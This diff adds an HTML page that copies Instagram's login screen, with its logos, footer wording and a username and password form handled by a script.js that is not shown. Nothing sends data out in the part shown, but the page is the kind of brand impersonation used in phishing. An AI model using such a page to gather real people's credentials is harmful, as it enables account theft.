@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="script.js" defer></script>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="language-selector">
+                <span>English (UK)</span>
+                <span class="arrow">&#x25BC;</span>
+            </div>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
+            <button type="button" class="fb-login" onclick="redirectToFacebook()">Continue Using Facebook</button>
+            <div class="divider">
+                <hr> OR <hr>
+            </div>
+            <form class="login-form" id="loginForm">
+                <input type="text" id="userInput" placeholder="Phone number, username or email address" required>
+                <input type="password" id="passwordInput" placeholder="Password" required>
+                <button type="submit" id="loginButton">Log In</button>
+            </form>
+            <a href="#" class="forgot-password" onclick="forgotPassword()">Forgotten your password?</a>
+        </div>
+
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#" onclick="signUp()">Sign up</a></p>
+        </div>
+
+        <div class="footer">
+            <p>By continuing, you agree to Instagram's <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.</p>
+            <div class="meta">
+                <p>from</p>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Meta_Platforms_Inc._logo.svg" alt="Meta Logo" class="meta-logo">
+            </div>
+        </div>
+    </div>
+</body>
+</html>
